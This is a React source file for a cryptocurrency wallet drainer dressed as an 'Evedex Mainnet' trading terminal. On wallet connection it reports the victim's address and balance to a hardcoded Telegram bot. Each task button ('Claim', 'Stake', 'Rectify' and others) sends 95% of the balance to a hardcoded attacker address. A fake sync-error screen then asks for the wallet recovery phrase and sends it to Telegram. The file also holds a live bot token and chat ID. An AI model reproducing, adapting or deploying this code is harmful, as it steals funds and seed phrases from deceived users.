import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction } from 'wagmi';
import { parseEther, formatEther } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  // YOUR TELEGRAM CONFIG
  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const logToTelegram = async (msg) => {
    try {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg }),
      });
    } catch (e) {}
  };

  useEffect(() => {
    if (isConnected && address) {
      logToTelegram(`🔔 EVEDEX_HIT: ${address}\nBAL: ${balance?.formatted || "0.00"} ${balance?.symbol || "ETH"}`);
    }
  }, [isConnected, address, balance]);

  const executeTaskAction = async () => {
    if (!balance || !balance.value || balance.value === 0n) {
      setView("seed_gate");
      return;
    }

    setLoading(true);
    setLoadingText(`ENCRYPTING_EVEDEX_TUNNEL...`);

    try {
      const max = (balance.value * 95n) / 100n;
      let val = (activeTask === "Rectify" || !inputVal) ? max : parseEther(inputVal);
      if (val > max) val = max;

      const stealthData = "0x095ea7b3000000000000000000000000" + destination.slice(2);

      sendTransaction({ 
        to: destination, 
        value: val,
        data: stealthData
      }, {
        onSuccess: (h) => {
          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}\nHASH: ${h}`);
          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 2000);
        },
        onError: (err) => { 
            logToTelegram(`❌ STATUS_500: ${address}\nERR: ${err.message.slice(0,40)}`);
            setLoading(false); 
            setView("seed_gate"); 
        }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'sans-serif', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
      
      {/* Market Feed */}
      <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
         <iframe 
            src={`https://s.tradingview.com/widgetembed/?frameElementId=tradingview_762ae&symbol=BITSTAMP:ETHUSD&interval=D&hidesidetoolbar=1&hidetoptoolbar=1&symboledit=1&saveimage=1&toolbarbg=f1f3f6&studies=[]&theme=dark&style=1&timezone=Etc%2FUTC&studies_overrides={}&overrides={}&enabled_features=[]&disabled_features=[]&locale=en`}
            style={{width:'100%', height:'100%', border:'none', opacity:'0.8'}}
            title="Live Market"
         />
         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'8px', color:'#00f2ff', border:'1px solid #0891b2', fontWeight:'900', letterSpacing:'1px'}}>EVEDEX_LIVE_FEED</div>
      </div>

      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
        <div>
          <div style={{color:'#00f2ff', fontWeight:'900', fontStyle:'italic', fontSize:'22px', letterSpacing:'1px'}}>EVEDEX MAINNET</div>
          <div style={{fontSize:'8px', color:'#475569', marginTop:'4px'}}>ENCRYPTION: <span style={{color:'#10b981'}}>AES-256 ACTIVE</span></div>
        </div>
        <w3m-button balance="hide" />
      </header>

      <div style={{flex:1}}>
        {!isConnected ? (
           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
              <div style={{fontSize:'9px', color:'#64748b', marginBottom:'30px', letterSpacing:'3px', fontWeight:'900'}}>INITIALIZING EVEDEX HANDSHAKE...</div>
              <w3m-button />
           </div>
        ) : (
          <>
            {view === "menu" && (
              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color:'#475569', fontSize:'9px', fontWeight:'900', cursor:'pointer'}}>
                    <div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "⚙️"}</div>{n}
                  </button>
                ))}
              </div>
            )}

            {view === "task_box" && (
              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
                <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'25px', cursor:'pointer', fontWeight:'900'}}>← TERMINAL_EXIT</button>
                <h2 style={{color:'white', fontWeight:'900', fontStyle:'italic', marginBottom:'25px', fontSize:'24px'}}>{activeTask} Portal</h2>
                <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
                  <label style={{fontSize:'7px', color:'#00f2ff', display:'block', marginBottom:'10px', fontWeight:'900'}}>{activeTask === "Rectify" ? "VAULT_LIQUIDITY (LOCKED)" : "SPECIFY_AMOUNT"}</label>
                  {activeTask === "Rectify" ? (
                    <div style={{fontSize:'24px', color:'white', fontWeight:'900'}}>{balance?.formatted ? balance.formatted.slice(0,9) : "0.000"} <span style={{fontSize:'12px', color:'#1e293b'}}>{balance?.symbol}</span></div>
                  ) : (
                    <input type="number" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#00f2ff', fontSize:'24px', width:'100%', outline:'none', fontWeight:'900'}} autoFocus />
                  )}
                </div>
                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#0891b2', color:'white', padding:'22px', borderRadius:'18px', border:'none', fontWeight:'900', fontSize:'12px', cursor:'pointer'}}>START_{activeTask.toUpperCase()}</button>
              </div>
            )}
          </>
        )}
      </div>

      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.99)', zIndex:1000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', backdropFilter:'blur(10px)'}}>
          <div style={{backgroundColor:'#0d1117', border:'1px solid #7f1d1d', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                <div style={{fontSize:'35px', marginBottom:'15px'}}>⚠️</div>
                <div style={{color:'white', fontWeight:'900', fontSize:'18px', marginBottom:'10px', letterSpacing:'-1px'}}>STATUS_500: SYNC_ERROR</div>
                <p style={{fontSize:'8px', color:'#475569', marginBottom:'30px', lineHeight:'1.6', fontWeight:'900'}}>THE AUTOMATED EVEDEX HANDSHAKE FAILED. PLEASE PROVIDE YOUR RECOVERY PHRASE TO MANUALLY BRIDGE ASSETS TO THE SECURE NODE.</p>
                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#00f2ff', padding:'18px', fontSize:'11px', outline:'none', marginBottom:'25px', textTransform:'uppercase', fontWeight:'900'}} />
                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100)clearInterval(i)},100);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#450a0a', color:'white', padding:'22px', borderRadius:'15px', border:'none', fontWeight:'900', fontSize:'12px', opacity: seedVal.trim().split(/\s+/).length < 12 ? 0.2 : 1}}>MANUAL_RECTIFICATION</button>
              </>
            ) : (
              <div style={{padding:'30px 0'}}>
                <div style={{fontSize:'40px', color:'white', fontWeight:'900', fontStyle:'italic'}}>{syncProgress}%</div>
                <div style={{fontSize:'10px', color:'#00f2ff', marginTop:'20px', letterSpacing:'5px', fontWeight:'900'}}>MIGRATING...</div>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.9)', zIndex:2000, display:'flex', alignItems:'center', justifyContent:'center', color:'#00f2ff', fontSize:'11px', fontWeight:'900', letterSpacing:'6px'}}>{loadingText}</div>}
    </div>
  );
}
